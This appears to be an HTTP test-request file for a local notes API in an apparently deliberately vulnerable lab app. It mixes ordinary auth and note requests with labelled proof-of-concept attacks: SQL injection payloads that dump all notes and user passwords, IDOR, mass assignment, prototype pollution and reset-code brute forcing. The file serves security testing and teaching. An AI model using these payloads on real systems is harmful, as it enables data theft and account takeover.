@baseUrl = http://localhost:3002

### Health check
GET {{baseUrl}}/health

### CORS — fixed, preflight from an arbitrary origin should NOT get Access-Control-Allow-Origin back
OPTIONS {{baseUrl}}/notes
Origin: https://evil-attacker-site.com
Access-Control-Request-Method: GET

### Register
POST {{baseUrl}}/auth/register
Content-Type: application/json

{
  "email": "test@test3.com",
  "password": "123456"
}


### Login
POST {{baseUrl}}/auth/login
Content-Type: application/json

{
  "email": "test@test1.com",
  "password": "123456"
}

### ------------------------------
### Password recovery

### Request reset code (check server console log for the code, it's not really emailed)
POST {{baseUrl}}/auth/recover-password
Content-Type: application/json

{
  "email": "test@test3.com"
}

### Confirm reset with the code from the server log
POST {{baseUrl}}/auth/recover-password/confirm
Content-Type: application/json

{
  "email": "test@test3.com",
  "code": "CODE_FROM_LOG",
  "newPassword": "newpassword123"
}

### Brute-force check — fixed, rate limit now kicks in after a few attempts (script this with a loop)
POST {{baseUrl}}/auth/recover-password/confirm
Content-Type: application/json

{
  "email": "test@test3.com",
  "code": "000000",
  "newPassword": "hacked123"
}

### ------------------------------
### Notes (replace TOKEN with a login response's token)
@token = TOKEN

### List notes
GET {{baseUrl}}/notes
Authorization: Bearer {{token}}

### Search notes by title
GET {{baseUrl}}/notes/search?q=grocery
Authorization: Bearer {{token}}

### Search notes — SQLi PoC (dumps every note from every user, not just yours)
GET {{baseUrl}}/notes/search?q=x%25' OR 1=1 --
Authorization: Bearer {{token}}

### Search notes — A10 PoC (broken SQLi payload leaks the full query + attacker input reflected in it)
GET {{baseUrl}}/notes/search?q=' OR 1=1) UNION SELECT password FROM users --
Authorization: Bearer {{token}}

### Get note by id (replace NOTE_ID with a sequential integer — this is the IDOR PoC, try ids that aren't yours)
GET {{baseUrl}}/notes/NOTE_ID
Authorization: Bearer {{token}}

### Create note
POST {{baseUrl}}/notes
Authorization: Bearer {{token}}
Content-Type: application/json

{
  "title": "My first note",
  "body": "hello world"
}

### Create note — mass assignment PoC (attach to a guessed user_id, ids are sequential)
POST {{baseUrl}}/notes
Authorization: Bearer {{token}}
Content-Type: application/json

{
  "title": "Not mine",
  "body": "attacker note",
  "user_id": 2
}

### Update note (replace NOTE_ID)
PUT {{baseUrl}}/notes/NOTE_ID
Authorization: Bearer {{token}}
Content-Type: application/json

{
  "title": "Updated title",
  "body": "updated body"
}

### Update note — prototype pollution PoC (accepted silently, no schema validation)
PUT {{baseUrl}}/notes/NOTE_ID
Authorization: Bearer {{token}}
Content-Type: application/json

{
  "title": "Polluted attempt",
  "body": "payload",
  "__proto__": { "isAdmin": true }
}

### Delete note (replace NOTE_ID)
DELETE {{baseUrl}}/notes/NOTE_ID
Authorization: Bearer {{token}}
